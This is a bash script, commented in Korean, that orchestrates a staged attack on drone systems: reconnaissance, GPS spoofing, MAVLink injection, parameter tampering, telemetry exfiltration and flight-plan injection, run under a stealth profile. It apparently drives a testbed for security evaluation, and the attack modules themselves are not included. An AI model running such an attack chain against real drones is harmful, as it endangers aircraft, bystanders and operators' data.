#!/usr/bin/env bash
# 종합적인 다단계 공격 시나리오
set -euo pipefail
echo "=== 종합 공격 시나리오 시작 ==="
BASE_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)/.."
cd "$BASE_DIR"
source 00_env.sh
source "$(dirname "$0")/options.d/profile_stealth.env"

# 페이즈 1: 정찰 (60초)
echo "페이즈 1: 정찰 및 열거"
DUR=60 INTENSITY=low modules/wifi_network_discovery.sh & PID_WIFI=$!
sleep 10
DUR=50 INTENSITY=low modules/mavlink_service_discovery.sh & PID_MAV=$!
sleep 10
DUR=40 INTENSITY=low modules/camera_stream_discovery.sh & PID_CAM=$!

wait $PID_WIFI $PID_MAV $PID_CAM

# 페이즈 2: 초기 침투 (90초)
echo "페이즈 2: 초기 침투"
DUR=90 INTENSITY=medium modules/gps_spoofing_attack.sh & PID_GPS=$!
sleep 15
DUR=75 INTENSITY=medium modules/mavlink_packet_injection.sh & PID_INJ=$!

wait $PID_GPS $PID_INJ

# 페이즈 3: 확장 및 지속성 (120초)
echo "페이즈 3: 확장 및 지속성"
DUR=120 INTENSITY=medium modules/parameter_manipulation.sh & PID_PARAM=$!
sleep 20
DUR=100 INTENSITY=medium modules/telemetry_exfiltration.sh & PID_EXFIL=$!
sleep 20
DUR=80 INTENSITY=high modules/flight_plan_injection.sh & PID_FLIGHT=$!

wait $PID_PARAM $PID_EXFIL $PID_FLIGHT

echo "=== 종합 공격 시나리오 완료 ==="
echo "자동 평가 시작..."
tools/auto_eval.sh
